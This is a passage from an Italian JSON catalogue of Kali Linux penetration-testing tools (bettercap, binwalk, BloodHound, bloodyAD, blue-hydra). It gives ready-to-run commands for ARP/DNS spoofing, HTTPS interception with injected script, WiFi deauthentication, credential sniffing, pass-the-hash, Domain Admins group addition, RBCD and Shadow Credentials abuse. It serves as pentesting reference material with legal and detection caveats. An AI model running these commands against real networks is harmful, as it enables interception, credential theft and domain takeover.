3: DNS Spoof (opzionale)\nsudo bettercap -iface wlan0 -eval \"set dns.spoof.domains *.facebook.com; dns.spoof on\"\n\n# Post-capture: estrai credenziali\nstrings capture.pcap | grep -i 'pass\\|user\\|login'\n# Oppure PCredz per parsing automatico</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, crea rapidamente Evil Twin per testare se dipendenti si connettono a reti non verificate e inseriscono credenziali.</p><p>Per <strong>Red Team</strong> in luoghi pubblici (caffè, aeroporti, hotel), intercetta credenziali di utenti che cercano WiFi gratuito.</p><p>In <strong>Security Awareness Training</strong>, demo dal vivo di quanto sia pericoloso connettersi a WiFi sconosciuti.</p><p>Per <strong>Rogue AP Detection Testing</strong>, verifica se WIDS/WIPS aziendali rilevano e alertano su AP malevoli.</p><p>In <strong>Captive Portal Testing</strong>, simula hotspot con pagina di login per valutare comportamento utenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Creare AP malevoli e intercettare traffico è reato penale (intercettazione comunicazioni, frode informatica) senza autorizzazione esplicita scritta.</p><p><strong>Detection WIDS:</strong> Sistemi WIPS enterprise rilevano Evil Twin (stesso SSID, BSSID diverso) e possono localizzare l'attaccante.</p><p><strong>HSTS:</strong> Browser moderni con HSTS non permettono downgrade HTTPS per siti visitati precedentemente. sslstrip inefficace su siti principali.</p><p><strong>Certificate Warnings:</strong> HTTPS interception genera warning certificato. Utenti attenti non procederanno.</p><p><strong>Hardware:</strong> Non tutti gli adapter WiFi supportano AP mode. Verificare con 'iw list' (AP nella lista modes).</p><p><strong>Interferenza:</strong> AP sullo stesso canale della rete target crea interferenza rilevabile. Considerare canali adiacenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "bettercap",
    "name": "bettercap",
    "version": "2.33.0",
    "icon": "../app/icons/bettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bettercap/",
    "desc": "Swiss army knife per attacchi di rete: MITM, ARP spoof, WiFi, BLE, HID injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bettercap</strong> è il framework MITM più completo e moderno, sviluppato da evilsocket come successore spirituale di ettercap. Scritto in Go per performance e portabilità, supporta attacchi su reti Ethernet (ARP/DNS/DHCP spoofing), WiFi (monitor mode, deauth, handshake capture, PMKID, evil twin), Bluetooth Low Energy (enum, read/write characteristics), e dispositivi HID (keystroke injection). Include interfaccia web interattiva real-time, scripting JavaScript per proxy manipulation, e caplets (script di automazione) per workflow complessi. È lo standard de facto per network security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network MITM:</strong> ARP spoofing (half/full duplex), DNS spoofing con wildcard, DHCP spoofing, NDP spoofing (IPv6). Sniffer integrato per HTTP, FTP, IMAP, SMTP, NTLM, Kerberos.</p><p><strong>HTTP(S) Proxy:</strong> Transparent proxy con JS injection, content manipulation, SSLstrip 2.0 (hstshijack caplet per HSTS bypass).</p><p><strong>WiFi Module:</strong> Monitor mode, client/AP discovery, deauthentication, handshake capture automatico, PMKID attack, evil twin AP integrato.</p><p><strong>BLE Module:</strong> Scansione dispositivi, enumeration services/characteristics, read/write values - completo testing IoT.</p><p><strong>HID Module:</strong> Keystroke injection via dispositivi HID compatibili (Rubber Ducky style).</p><p><strong>Caplets:</strong> Script di automazione che combinano comandi multipli. Repository ufficiale con caplet pronti all'uso.</p><p><strong>Web UI:</strong> Interfaccia grafica real-time per monitoring, controllo moduli, visualizzazione traffico.</p><p><strong>API REST:</strong> Controllo programmato via API per integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO E INTERFACCE ===\n# Interactive mode\nsudo bettercap -iface eth0\n\n# Con Web UI\nsudo bettercap -iface eth0 -caplet http-ui\n# Browser: http://127.0.0.1:80 (user:pass)\n\n# === NETWORK MITM ===\n# Discovery attivo della rete\nnet.probe on\nnet.show\n\n# ARP spoof completo della subnet\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nnet.sniff on\n\n# ARP spoof target specifico + gateway\nset arp.spoof.targets 192.168.1.50\nset arp.spoof.internal false\narp.spoof on\n\n# === DNS SPOOFING ===\nset dns.spoof.domains *.microsoft.com,*.office.com\nset dns.spoof.address 10.0.0.5  # IP del phishing server\ndns.spoof on\n\n# === HTTPS INTERCEPTION ===\n# hstshijack bypassa HSTS per molti siti\nsudo bettercap -iface eth0 -caplet hstshijack/hstshijack\n\n# Proxy con JS injection custom\nset http.proxy.script /path/to/inject.js\nset https.proxy.script /path/to/inject.js\nhttp.proxy on\nhttps.proxy on\n\n# inject.js esempio:\n# function onResponse(req, res) {\n#   if(res.ContentType.indexOf('text/html') == 0) {\n#     res.Body = res.Body.replace('</head>', '<script>alert(1)</script></head>');\n#   }\n# }\n\n# === WIFI ATTACKS ===\n# Metti interfaccia in monitor (se non già)\nwifi.recon on\nwifi.show  # Lista AP e clients\n\n# Deauth target per catturare handshake\nwifi.deauth AA:BB:CC:DD:EE:FF\n\n# PMKID attack (no client necessario)\nwifi.assoc AA:BB:CC:DD:EE:FF\n\n# Evil Twin integrato\nwifi.ap on\n\n# === BLE ATTACKS ===\nble.recon on\nble.show  # Lista dispositivi BLE\n\n# Enumera servizi\nble.enum AA:BB:CC:DD:EE:FF\n\n# Leggi/scrivi caratteristica\nble.write AA:BB:CC:DD:EE:FF [UUID] [HEX_DATA]\n\n# === CAPLETS UTILI ===\n# Credential sniffing completo\nsudo bettercap -caplet local-sniffer.cap\n\n# HTTP/HTTPS interception con log\nsudo bettercap -caplet https-ui.cap\n\n# Autopwn: discovery + arp spoof + sniff automatico\nsudo bettercap -caplet autopwn.cap\n\n# === AUTOMAZIONE CUSTOM ===\ncat > mitm.cap << 'EOF'\nnet.probe on\nsleep 5\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nset net.sniff.verbose true\nset net.sniff.filter \"host 192.168.1.50\"\nnet.sniff on\nEOF\nsudo bettercap -caplet mitm.cap\n\n# === CREDENTIAL EXTRACTION ===\n# Le credenziali catturate appaiono in real-time\n# Per salvare:\nevents.stream off\nset events.stream.output /tmp/creds.log\nevents.stream on</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Pentesting</strong>, è lo strumento primario per MITM, credential harvesting, e traffic manipulation su reti switched.</p><p>Per <strong>Wireless Assessment</strong>, combina discovery, deauth, handshake capture e cracking in un unico framework.</p><p>In <strong>IoT Security</strong>, il modulo BLE permette testing completo di dispositivi smart home, wearables, beacon.</p><p>Per <strong>Red Team</strong>, i caplets automatizzano catene di attacco complesse riproducibili.</p><p>In <strong>Security Research</strong>, l'API REST permette integrazione con tool custom per automazione avanzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ARP Detection:</strong> ARP spoofing è facilmente rilevabile da arpwatch, IDS (Snort, Suricata), switch con DAI. Il pattern di traffico è distintivo.</p><p><strong>HSTS Limitations:</strong> hstshijack funziona solo su siti non pre-loaded in browser HSTS list. Google, Facebook, Twitter sono immune.</p><p><strong>802.1X:</strong> Reti con 802.1X (port authentication) limitano la capacità di spoofing - serve autenticazione valida prima.</p><p><strong>WiFi Detection:</strong> Deauth frames sono rilevabili da WIDS. Alcuni AP hanno protezione anti-deauth.</p><p><strong>Logging:</strong> Bettercap logga tutto localmente. Pulire ~/.bettercap dopo engagement.</p><p><strong>Performance:</strong> Su reti grandi, ARP spoof di tutta la subnet può saturare la CPU. Limitare target quando possibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "binwalk",
    "name": "binwalk",
    "version": "2.4.3",
    "icon": "../app/icons/binwalk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/binwalk/",
    "desc": "Analizza firmware ed estrae filesystem embedded, compressioni e file nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Binwalk</strong> è lo strumento standard de facto per l'analisi e l'estrazione di firmware, sviluppato da ReFirm Labs (ora parte di Microsoft). Scansiona file binari alla ricerca di oltre 500 signature note: header di filesystem (SquashFS, JFFS2, CramFS, YAFFS, UBI, ext2/3/4), algoritmi di compressione (gzip, LZMA, XZ, bzip2, LZO, Zstd), bootloader (U-Boot, ARM/MIPS bootstrap), certificati X.509, chiavi RSA/DSA, e formati proprietari. Estrae ricorsivamente tutti i componenti identificati, permettendo l'analisi completa di firmware per router, IoT, telecamere IP, automotive ECU, e qualsiasi embedded device.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature Scanning:</strong> Database magic bytes esteso per filesystem embedded, compressioni, bootloader, kernel Linux, certificati SSL, chiavi crypto. Customizzabile con .magic files.</p><p><strong>Recursive Extraction:</strong> Estrae automaticamente contenuti compressi e filesystem nested, seguendo ricorsivamente strutture embedded multi-livello (common in router firmware).</p><p><strong>Entropy Analysis:</strong> Visualizza grafico entropia del file per identificare sezioni cifrate (alta entropia costante) vs compresse (alta entropia variabile) vs plaintext (bassa entropia).</p><p><strong>Disassembly:</strong> Plugin opcode scanning per identificare architetture CPU (ARM, MIPS, x86, PPC) e entry point.</p><p><strong>Hex/Strings:</strong> Utility integrate per analisi manuale: hexdump, raw strings extraction, Unicode strings.</p><p><strong>Custom Signatures:</strong> Supporto per .magic file personalizzati per formati proprietari.</p><p><strong>Plugins:</strong> Architettura plugin estendibile per analisi specifiche (lzma decompressor, crypto detection, etc.).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ANALISI BASE ===\n# Scansione signature con output dettagliato\nbinwalk -B firmware.bin\n\n# Con verbose per vedere tutti i match\nbinwalk -Bv firmware.bin | tee analysis.txt\n\n# === ESTRAZIONE ===\n# Estrazione automatica (crea directory _firmware.bin.extracted/)\nbinwalk -e firmware.bin\n\n# Estrazione ricorsiva (estrae anche archivi dentro archivi)\nbinwalk -Me firmware.bin\n\n# Con privilegi root (necessario per alcuni filesystem)\nbinwalk -Me --run-as=root firmware.bin\n\n# Estrazione con offset specifico\nbinwalk --offset=0x40000 -e firmware.bin\n\n# === ENTROPY ANALYSIS ===\n# Genera grafico entropia (identifica cifratura)\nbinwalk -E firmware.bin\n\n# Salva grafico come PNG\nbinwalk -E --save firmware.bin\n\n# Con legenda dettagliata\nbinwalk -E --nplot firmware.bin  # Solo dati, no plot\n\n# === ESTRAZIONE SELETTIVA ===\n# Estrai solo filesystem specifico\nbinwalk --dd='squashfs:squashfs' firmware.bin\n\n# Estrai con handler custom (decompressione LZMA)\nbinwalk --dd='lzma compressed data:lzma:unlzma %e' firmware.bin\n\n# === COMPARISON ===\n# Diff tra due versioni firmware\nbinwalk -W firmware_v1.bin firmware_v2.bin\n\n# === CUSTOM MAGIC ===\n# Usa file magic personalizzato\nbinwalk --magic=/path/to/vendor.magic firmware.bin\n\n# === WORKFLOW COMPLETO IoT ANALYSIS ===\n# 1. Analisi iniziale\nbinwalk -Bv firmware.bin | tee initial_analysis.txt\n\n# 2. Check entropia (cifratura?)\nbinwalk -E --save firmware.bin\n\n# 3. Estrazione ricorsiva\nbinwalk -Me --run-as=root firmware.bin\n\n# 4. Cerca credenziali hardcoded\ncd _firmware.bin.extracted\nfind . -name \"*.conf\" -exec grep -l -i \"password\\|passwd\\|secret\" {} \\;\nfind . -name \"shadow\" -exec cat {} \\;\nfind . -name \"*.pem\" -o -name \"*.key\" | head\ngrep -r \"admin:\" .\ngrep -r \"root:\" .\n\n# 5. Identifica binari interessanti\nfind . -name \"*cgi*\" -o -name \"*httpd*\" -o -name \"*telnetd*\"\nfile $(find . -type f -executable) | grep -i \"arm\\|mips\"\n\n# 6. Estrai per reverse engineering\ncp ./squashfs-root/bin/vulnerable_binary /analysis/\n\n# === INTEGRAZIONE ===\n# Con firmwalker per analisi automatica\nfirmwalker.sh _firmware.bin.extracted/ report.txt\n\n# Con EMBA per vulnerability assessment\n./emba.sh -f firmware.bin -l ~/emba_logs</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>IoT Pentesting</strong>, primo passo obbligatorio: estrazione firmware per analizzare filesystem, credenziali hardcoded, certificati, e binari vulnerabili.</p><p>Per <strong>Vulnerability Research</strong>, permette di ottenere binari embedded (CGI, daemon, librerie) da analizzare con IDA Pro, Ghidra, o radare2.</p><p>In <strong>Supply Chain Security</strong>, verifica componenti third-party embedded, versioni librerie, e presenza di backdoor note.</p><p>Per <strong>CTF</strong>, le challenge firmware nascondono flag in filesystem, sezioni compresse, o binari modificati.</p><p>In <strong>Compliance Audit</strong>, verifica che firmware non contenga credenziali default, certificati scaduti, o componenti EOL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Firmware Cifrati:</strong> Vendor come TP-Link, Netgear usano XOR, AES o custom encryption. Richiede reverse engineering del bootloader/updater per chiavi.</p><p><strong>Signature Sconosciute:</strong> Formati proprietari non vengono riconosciuti. Analisi entropia + hex editor per identificare manualmente.</p><p><strong>Filesystem Corrotti:</strong> Estrazione può fallire su firmware parzialmente scaricati o corrotti. Verificare hash prima.</p><p><strong>Legal:</strong> In alcune giurisdizioni, reverse engineering firmware può violare DMCA/EUCD. Verificare termini di licenza.</p><p><strong>Dimensioni:</strong> Firmware grandi (>100MB) richiedono molto spazio per estrazione ricorsiva (10x+). Verificare spazio disponibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "bloodhound-kali",
    "name": "bloodhound",
    "version": "8.1.0",
    "icon": "../app/icons/bloodhound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodhound/",
    "desc": "Visualizza relazioni in Active Directory per trovare path di privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BloodHound</strong> rivoluziona l'analisi di Active Directory visualizzando le relazioni di trust, membership, ACL e permessi come un grafo navigabile con database Neo4j. Sviluppato da SpecterOps, utilizza la teoria dei grafi per calcolare automaticamente i percorsi di attacco più brevi da qualsiasi utente compromesso fino a Domain Admin, Enterprise Admin, o qualsiasi target definito. Trasforma giorni di analisi manuale in query istantanee, rivelando path di privilege escalation attraverso group membership, sessioni attive, deleghe Kerberos, ACL abusabili, GPO, certificati ADCS, e relazioni cross-domain che sarebbero impossibili da identificare manualmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Attack Path Analysis:</strong> Query pre-configurate per trovare shortest path verso DA, utenti Kerberoastable/AS-REProastable, deleghe pericolose (Unconstrained, Constrained, RBCD), ACL abusabili (GenericAll, WriteDACL, WriteOwner).</p><p><strong>Visual Graph Interface:</strong> Interfaccia grafica interattiva Neo4j-based che mostra nodi (User, Computer, Group, GPO, OU, Domain) e relazioni (MemberOf, AdminTo, HasSession, GenericAll, ecc.).</p><p><strong>Custom Cypher Queries:</strong> Supporto completo per query Cypher personalizzate per analisi specifiche dell'ambiente target.</p><p><strong>Multi-Domain Support:</strong> Analizza relazioni cross-domain e cross-forest per ambienti enterprise complessi.</p><p><strong>ADCS Integration:</strong> BloodHound 4.x+ include analisi di Active Directory Certificate Services per attacchi ESC1-ESC8.</p><p><strong>Azure AD Support:</strong> Con AzureHound, estende l'analisi a Entra ID e Azure RM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DATA COLLECTION - SHARPHOUND (Windows) ===\n# Collection completa (rumorosa)\nSharpHound.exe -c All --zipfilename bh_full.zip\n\n# Collection stealth - solo essenziale\nSharpHound.exe -c DCOnly,GPOLocalGroup --outputdirectory C:\\Temp --zipfilename bh.zip\n\n# Session loop - cattura sessioni nel tempo\nSharpHound.exe -c Session --Loop --Loopduration 02:00:00 --loopinterval 00:05:00\n\n# Exclude Domain Controllers (meno rumore)\nSharpHound.exe -c All --excludedcs\n\n# Domain specifico in ambiente multi-domain\nSharpHound.exe -c All -d child.domain.local\n\n# === DATA COLLECTION - BLOODHOUND-PYTHON (Linux) ===\n# Collection base\nbloodhound-python -d domain.local -u user -p 'Pass123!' -ns 10.0.0.1 -c All\n\n# Con output zip\nbloodhound-python -d domain.local -u user -p pass -c All --zip\n\n# Via SOCKS proxy (pivoting)\nproxychains bloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1 -c All\n\n# Pass-the-Hash\nbloodhound-python -d domain.local -u admin --hashes aad3b435:31d6cfe0d16ae931 -ns dc01 -c All\n\n# Con Kerberos ticket (CCACHE)\nexport KRB5CCNAME=/tmp/krb5cc_user\nbloodhound-python -d domain.local -u user -k -c All\n\n# === IMPORT E ANALISI ===\n# Avvia BloodHound GUI\nbloodhound\n# o BloodHound CE (Community Edition) via Docker\n\n# Drag-and-drop file ZIP nella GUI\n# Database > Upload Data\n\n# === QUERY PRE-BUILT ===\n# Analysis > Pre-Built Analytics\n# - Find Shortest Paths to Domain Admins\n# - Find Kerberoastable Users\n# - Find AS-REP Roastable Users\n# - Find Computers with Unconstrained Delegation\n# - Shortest Path from Owned Principals\n\n# === CUSTOM CYPHER QUERIES ===\n# Shortest path da utente specifico a DA\nMATCH p=shortestPath((n:User {name:\"JSMITH@DOMAIN.LOCAL\"})-[*1..]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"}))\nRETURN p\n\n# Tutti i path verso DA (non solo shortest)\nMATCH p=(n:User)-[*1..5]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})\nRETURN p LIMIT 100\n\n# Kerberoastable users con path to DA\nMATCH (u:User {hasspn:true})\nMATCH p=shortestPath((u)-[*1..]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"}))\nRETURN u.name, LENGTH(p) as hops\nORDER BY hops\n\n# Utenti con DCSync rights\nMATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain)\nRETURN n.name\n\n# Computer con Unconstrained Delegation\nMATCH (c:Computer {unconstraineddelegation:true})\nRETURN c.name\n\n# ACL abusabili su Domain Admins\nMATCH (n)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})\nRETURN n.name, type(r)\n\n# === MARK OWNED / HIGH VALUE ===\n# Mark utente come compromesso\nMATCH (n:User {name:\"COMPROMISED@DOMAIN.LOCAL\"})\nSET n.owned=true\nRETURN n\n\n# Set starting point\nMATCH (n:User {name:\"JSMITH@DOMAIN.LOCAL\"})\nSET n.owned=true\nRETURN n\n\n# Mark high value target\nMATCH (n:Computer {name:\"SQLSERVER.DOMAIN.LOCAL\"})\nSET n.highvalue=true\nRETURN n</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>imprescindibile</strong> in ogni AD pentest - dopo l'accesso iniziale, BloodHound rivela immediatamente tutti i path verso Domain Admin.</p><p>Per <strong>Blue Team</strong>, identifica debolezze strutturali (ACL eccessivi, deleghe pericolose, utenti Kerberoastable) da correggere proattivamente.</p><p>In <strong>Threat Hunting</strong>, evidenzia account con privilegi eccessivi che potrebbero indicare compromissione.</p><p>Per <strong>Purple Team</strong>, valida che le correzioni abbiano effettivamente eliminato i path di attacco.</p><p>In <strong>Compliance/Audit</strong>, documenta la matrice di privilegi effettivi vs. intended.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Detection:</strong> SharpHound genera query LDAP intensive verso tutti i DC. Microsoft Defender for Identity rileva questo pattern come 'Reconnaissance using directory services queries'.</p><p><strong>SMB Sessions:</strong> Collection '-c Session' enumera sessioni via SMB su tutti i computer, generando traffico significativo e possibili alert.</p><p><strong>Stealth Collection:</strong> Usare '-c DCOnly' per limitare le query ai soli DC. Evitare '-c All' in ambienti monitorati.</p><p><strong>Time-Based:</strong> Session loop cattura sessioni admin che appaiono/scompaiono. Più collection = più copertura ma più rischio detection.</p><p><strong>Cleanup:</strong> I file ZIP contengono tutti i dati del dominio. Proteggere e cancellare dopo l'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "bloodyad",
    "name": "bloodyad",
    "version": "2.1.7",
    "icon": "../app/icons/bloodyad-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodyad/",
    "desc": "Tool AD per abusare ACL, deleghe, RBCD e modificare oggetti con privilegi minimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BloodyAD</strong> è un tool Python per l'abuso di Active Directory che opera esclusivamente via LDAP/LDAPS, permettendo di sfruttare misconfigurazioni di ACL, deleghe Kerberos, e attributi AD senza richiedere privilegi elevati o accesso locale a Domain Controller. Sviluppato da CravateRouge, implementa le tecniche di privilege escalation più comuni identificate da BloodHound: abuso GenericAll/GenericWrite/WriteDACL, Resource-Based Constrained Delegation (RBCD), Shadow Credentials (msDS-KeyCredentialLink), password operations, e modifiche a gruppi/oggetti. È lo strumento ideale per exploitation AD da Linux attraverso tunnel o proxy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Abuse:</strong> Sfrutta permessi eccessivi: GenericAll (full control), GenericWrite (modify attributes), WriteDACL (modify permissions), WriteOwner (take ownership), AddMember (add to groups).</p><p><strong>RBCD Attack:</strong> Configura msDS-AllowedToActOnBehalfOfOtherIdentity per Resource-Based Constrained Delegation, permettendo impersonation di utenti privilegiati.</p><p><strong>Shadow Credentials:</strong> Aggiunge msDS-KeyCredentialLink (certificato) a un account per ottenere TGT senza conoscere la password (richiede ADCS o chiave esistente).</p><p><strong>Password Operations:</strong> Reset password (ForceChangePassword), cambio password (Self permission), set password senza storico.</p><p><strong>Group Management:</strong> Aggiunta/rimozione membri da gruppi inclusi Domain Admins se si hanno i permessi.</p><p><strong>Object Modification:</strong> Modifica SPN (per Kerberoasting setup), UPN, servicePrincipalName, altri attributi.</p><p><strong>Computer Account:</strong> Crea machine account (default quota 10), imposta RBCD, gestisce msDS-ManagedPassword (gMSA).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Password\nbloodyAD -d domain.local -u user -p 'Pass123!' --host dc01.domain.local [comando]\n\n# Pass-the-Hash\nbloodyAD -d domain.local -u admin --hashes :31d6cfe0d16ae931 --host dc01 [comando]\n\n# Kerberos ticket\nexport KRB5CCNAME=/tmp/krb5cc_user\nbloodyAD -d domain.local -u user -k --host dc01 [comando]\n\n# Via proxy\nproxychains bloodyAD -d domain.local -u user -p pass --host dc01 [comando]\n\n# === ENUMERATION ===\n# Get info oggetto\nbloodyAD -d domain.local -u user -p pass --host dc01 get object 'CN=Target,CN=Users,DC=domain,DC=local'\n\n# Get membership\nbloodyAD -d domain.local -u user -p pass --host dc01 get membership targetuser\n\n# === ACL ABUSE ===\n# GenericAll -> Aggiungi a Domain Admins\nbloodyAD -d domain.local -u user -p pass --host dc01 add groupMember 'Domain Admins' targetuser\n\n# GenericAll/GenericWrite -> Reset password\nbloodyAD -d domain.local -u user -p pass --host dc01 set password targetuser 'NewP@ss123!'\n\n# WriteDACL -> Aggiungi GenericAll a te stesso\nbloodyAD -d domain.local -u user -p pass --host dc01 add genericAll 'CN=Target,DC=domain,DC=local' attackeruser\n\n# WriteOwner -> Prendi ownership poi WriteDACL\nbloodyAD -d domain.local -u user -p pass --host dc01 set owner 'CN=Target,DC=domain,DC=local' attackeruser\n\n# === RBCD ATTACK ===\n# 1. Crea computer account (se non ne hai uno)\nbloodyAD -d domain.local -u user -p pass --host dc01 add computer YOURPC$ 'Password123!'\n\n# 2. Imposta RBCD sul target (richiede GenericAll/GenericWrite su target computer)\nbloodyAD -d domain.local -u user -p pass --host dc01 add rbcd 'TARGETSERVER$' 'YOURPC$'\n\n# 3. Ora usa getST.py per impersonare admin\ngetST.py -spn cifs/TARGETSERVER.domain.local -impersonate Administrator domain.local/YOURPC$:'Password123!'\n\n# === SHADOW CREDENTIALS ===\n# Aggiungi KeyCredential (richiede GenericAll/GenericWrite)\nbloodyAD -d domain.local -u user -p pass --host dc01 add shadowCredentials targetuser\n\n# Output: certificato PFX\n# Usa per autenticazione:\ncertipy auth -pfx targetuser.pfx -domain domain.local\n\n# === COMPUTER ACCOUNT ===\n# Crea machine account\nbloodyAD -d domain.local -u user -p pass --host dc01 add computer YOURPC$ 'Password123!'\n\n# Set SPN (per Kerberoasting setup su account che controlli)\nbloodyAD -d domain.local -u user -p pass --host dc01 set object targetuser servicePrincipalName -v 'HTTP/fake.domain.local'\n\n# === CLEANUP ===\n# Rimuovi da gruppo\nbloodyAD -d domain.local -u user -p pass --host dc01 remove groupMember 'Domain Admins' targetuser\n\n# Rimuovi RBCD\nbloodyAD -d domain.local -u user -p pass --host dc01 remove rbcd 'TARGETSERVER$' 'YOURPC$'\n\n# Rimuovi Shadow Credentials\nbloodyAD -d domain.local -u user -p pass --host dc01 remove shadowCredentials targetuser</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando BloodHound identifica path ACL-based (es. 'User X ha GenericAll su User Y'), BloodyAD è lo strumento per sfruttarlo immediatamente.</p><p>Per <strong>RBCD attacks</strong>, è più pratico e veloce delle alternative PowerShell, specialmente da Linux.</p><p>Ideale per <strong>Linux-based AD pentesting</strong> senza necessità di accesso a macchina Windows joinata.</p><p>Per <strong>Shadow Credentials</strong> attack quando ADCS è presente ma non vulnerabile a ESC1-8.</p><p>In <strong>Assumed Breach</strong> scenarios, permette rapida escalation con credenziali low-priv.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Event Logging:</strong> Tutte le modifiche AD generano Event ID 5136 (Directory Service Changes). Modifiche a gruppi privilegiati triggherano alert in qualsiasi SIEM configurato.</p><p><strong>MDI Detection:</strong> Microsoft Defender for Identity rileva RBCD manipulation e Shadow Credentials come 'Suspected RBCD' attack.</p><p><strong>Rollback Essenziale:</strong> Sempre rimuovere le modifiche (RBCD, group membership, Shadow Credentials) al termine dell'engagement per evitare backdoor persistenti.</p><p><strong>Computer Account Quota:</strong> Default ms-DS-MachineAccountQuota è 10. Creare troppi account può essere notato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "blue-hydra",
    "name": "blue-hydra",
    "version": "1.9.20",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/blue-hydra/",
    "desc": "Rileva e monitora dispositivi Bluetooth classici e BLE nelle vicinanze.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Blue Hydra è un servizio di discovery Bluetooth progettato per monitoraggio continuo e tracking di dispositivi. A differenza di scanner semplici che mostrano solo dispositivi visibili al momento, Blue Hydra rileva simultaneamente Bluetooth Classic (BR/EDR) e Bluetooth Low Energy (BLE), mantenendo un database SQLite persistente con storico completo: timestamp primo/ultimo avvistamento, RSSI (potenza segnale per stima distanza), device class, servizi, manufacturer data. È progettato per deployment come sensore di sicurezza fisica o wireless monitoring station.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Mode Scanning:</strong> Rileva simultaneamente Bluetooth Classic (inquiry scan) e BLE (advertising scan) usando lo stesso adapter.</p><p><strong>Persistent Database:</strong> SQLite database con storico completo: device MAC, nome, classe, UUID servizi, primo/ultimo visto, conteggio osservazioni, RSSI medio.</p><p><strong>Device Fingerprinting:</strong> Raccoglie class of device (CoD), nome broadcast, servizi UUID, manufacturer specific data per identificare tipo dispositivo.</p><p><strong>MAC Tracking:</strong> Traccia dispositivi anche con MAC randomization parziale correlando altri attributi.</p><p><strong>Web Interface:</strong> Dashboard web real-time per visualizzare dispositivi attivi, storico, statistiche.</p><p><strong>API REST:</strong> Espone dati JSON per integrazione con SIEM, alerting, o altri sistemi di sicurezza.</p><p><strong>Ubertooth Support:</strong> Integrazione opzionale con Ubertooth One per capture avanzato e sniffing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO BASE ===\n# Avvio servizio (richiede adapter Bluetooth)\nsudo blue_hydra\n\n# Interfaccia web\n# Browser: http://localhost:8000\n\n# === CONFIGURAZIONE ===\n# Config file: /etc/blue_hydra/blue_hydra.yml\n# Opzioni principali:\nlog_level: info\nbt_device: hci0\nubertooth_device: /dev/ubertooth0  # se presente\ninfo_scan_rate: 60  # secondi tra scan\n\n# === QUERY DATABASE ===\n# Apri database SQLite\nsqlite3 /var/lib/blue_hydra/blue_hydra.db\n\n# Lista tutti i dispositivi\nSELECT address, name, classic_mode, le_mode, last_seen FROM blue_hydra_devices ORDER BY last_seen DESC;\n\n# Dispositivi visti nelle ultime 24h\nSELECT * FROM blue_hydra_devices WHERE last_seen > datetime('now', '-1 day');\n\n# Dispositivi per tipo (smartphone, PC, audio)\nSELECT address, name, classic_major_class, classic_minor_class FROM blue_hydra_devices WHERE classic_major_class = 'Phone';\n\n# Dispositivi BLE con servizi specifici\nSELECT address, name, le_service_uuids FROM blue_hydra_devices WHERE le_service_uuids LIKE '%180f%';  # Battery Service\n\n# Frequenza presenza (chi è sempre qui?)\nSELECT address, name, COUNT(*) as observations FROM blue_hydra_device_observations GROUP BY address ORDER BY observations DESC;\n\n# === ANALISI AVANZATA ===\n# Export per analisi 